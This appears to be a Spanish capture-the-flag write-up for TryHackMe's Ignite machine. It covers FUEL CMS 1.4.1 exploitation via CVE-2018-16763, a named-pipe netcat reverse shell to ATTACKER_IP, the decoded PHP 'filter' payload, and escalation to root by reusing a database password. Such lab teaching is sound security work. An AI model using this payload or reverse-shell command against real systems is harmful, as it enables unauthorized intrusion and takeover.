Ignite es una máquina Linux Easy de TryHackMe que corre FUEL CMS 1.4.1 — una versión con un fallo público de ejecución remota de código previa a la autenticación. El `robots.txt` apunta directamente al panel de administración `/fuel/`, que aún usa el `admin:admin` por defecto del fabricante, pero la vía de entrada ni siquiera lo necesita: **CVE-2018-16763** evalúa PHP suministrado por el atacante a través del parámetro `filter`, así que una sola petición entrega una shell como `www-data`. A partir de ahí la máquina es un regalo de reutilización de credenciales — la contraseña de la base de datos que está en `database.php` pertenece a `root` y está reutilizada para la cuenta del sistema.

## Reconocimiento y Enumeración

### Escaneo de Puertos

Un único escaneo de servicio a todos los puertos muestra que la máquina tiene una sola vía de entrada:

```bash
sudo nmap -p- -sS -sCV -Pn -n 10.128.186.42 -oN nmap
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-title: Welcome to FUEL CMS
```

Solo HTTP está abierto, y nmap ya ha hecho dos cosas útiles: identificar la aplicación como **FUEL CMS**, y leer un `robots.txt` que prohíbe `/fuel/` — el directorio exacto que se le pide a un crawler que ignore suele ser el primero que merece mirar.

```bash
curl http://10.128.186.42/robots.txt
```

### Enumeración Web — FUEL CMS

`/fuel/` es el login de administración del CMS:

![El panel de login de administración de FUEL CMS en /fuel/](/assets/img/THM/Ignite/cap2.png)

FUEL CMS trae una cuenta de administrador por defecto muy documentada, `admin:admin`, que aquí sigue funcionando — un hallazgo que conviene tener, aunque el exploit previsto es previo a la autenticación y no lo necesita:

![Documentación de FUEL CMS mostrando las credenciales por defecto, admin / admin](/assets/img/THM/Ignite/cap3.png)

El panel también revela la versión — **FUEL CMS 1.4.1** — que es vulnerable a **CVE-2018-16763**: el framework pasa el parámetro `filter` de `pages/select/` a una evaluación de PHP sin sanearlo, permitiendo ejecutar PHP arbitrario (y por tanto comandos del sistema) *antes* de cualquier login.

## Acceso Inicial — CVE-2018-16763 (RCE de FUEL CMS) como `www-data`

La entrada 47138 de Exploit-DB es un PoC ya hecho para el fallo. `searchsploit` lo encuentra y lo copia en local:

```bash
searchsploit fuel cms 1.4.1
searchsploit -m linux/webapps/47138.py
```

El script necesita dos pequeños ajustes antes de correr: apuntar su variable `url` al objetivo y —como está escrito para Python 2— ejecutarlo con `python2` o actualizar su sintaxis `raw_input`/`print`. Su payload es el CVE en miniatura: un valor `filter` URL-encodeado que decodifica a `'+pi(print($a='system'))+$a('<cmd>')+'`, cableando el `system()` de PHP y llamándolo con el comando que se teclee en el prompt `cmd:`.

Ejecutándolo y pidiendo una reverse shell con named pipe (el `/bin/sh` del objetivo no necesita bash para esto) conecta de vuelta directamente:

```bash
python2 exploit.py
```

```bash
cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

```bash
nc -nvlp 4444
```

```bash
Listening on 0.0.0.0 4444
Connection received on 10.128.186.42 46240
$ whoami
www-data
```

Tras el habitual tratamiento de la TTY, la flag de usuario está en el home de `www-data`:

```bash
www-data@ubuntu:/home/www-data$ cat flag.txt
REDACTED
```

## Escalada de Privilegios — `www-data` → `root`

Un vistazo rápido a los servicios a la escucha muestra MySQL enlazado a localhost — una base de datos con la que la web claramente habla, así que sus credenciales merece la pena encontrarlas:

```bash
www-data@ubuntu:/$ netstat -lntp
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
```

CodeIgniter (el framework sobre el que se construye FUEL CMS) guarda su configuración de base de datos en `database.php`:

```bash
www-data@ubuntu:/$ find / -name "database.php" 2>/dev/null
/var/www/html/fuel/application/config/database.php
www-data@ubuntu:/$ cat /var/www/html/fuel/application/config/database.php
$db['default'] = array(
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    ...
);
```

Antes de enumerar la base de datos, la comprobación más barata es si esa contraseña está reutilizada — y como el usuario de base de datos aquí es `root`, la reutilización que merece probar es contra el `root` del *sistema*:

```bash
www-data@ubuntu:/var/www/html$ su root
Password:
root@ubuntu:/var/www/html# cat /root/root.txt
REDACTED
```

La contraseña de base de datos `mememe` está reutilizada para la cuenta de root, y la máquina está resuelta.

## Conclusiones Clave

- **El `robots.txt` es un mapa, no un candado.** Su único trabajo es pedir a los crawlers educados que se salten una ruta — lo que anuncia esa ruta a cualquiera que lea el fichero. `/fuel/` fue la primera y mejor pista, entregada gratis.
- **Las credenciales por defecto sobreviven mucho más de lo que deberían.** `admin:admin` seguía funcionando en una instalación en producción; aunque el exploit real era pre-auth, un default de fabricante sin cambiar es un compromiso total por sí solo y lo primero que probar en cualquier producto reconocido.
- **Un número de versión conocido es un atajo a un exploit conocido.** Identificar FUEL CMS 1.4.1 convirtió toda la máquina en una búsqueda: la versión mapea directamente a CVE-2018-16763 y a un PoC público. Ocultar los banners de versión no salvará una app vulnerable, pero anunciarlos le quita al atacante el único trabajo real.
- **Los ficheros de configuración de los frameworks son almacenes de credenciales.** `database.php` guardaba una contraseña en texto claro, y la pista era el *usuario*: una base de datos que autentica como `root` invita a suponer que la misma contraseña abre el `root` del sistema. Que cuentas de servicio y cuentas humanas compartan contraseña es cómo una shell de usuario web se convierte en una shell de root en un comando.
- **Comprueba la reutilización antes de cavar.** Enumerar una base de datos puede ser lento; `su root` con la contraseña ya en mano es instantáneo. Cuando una credencial encontrada pertenece a un nombre privilegiado, probarla primero contra el SO es casi siempre el camino más rápido.
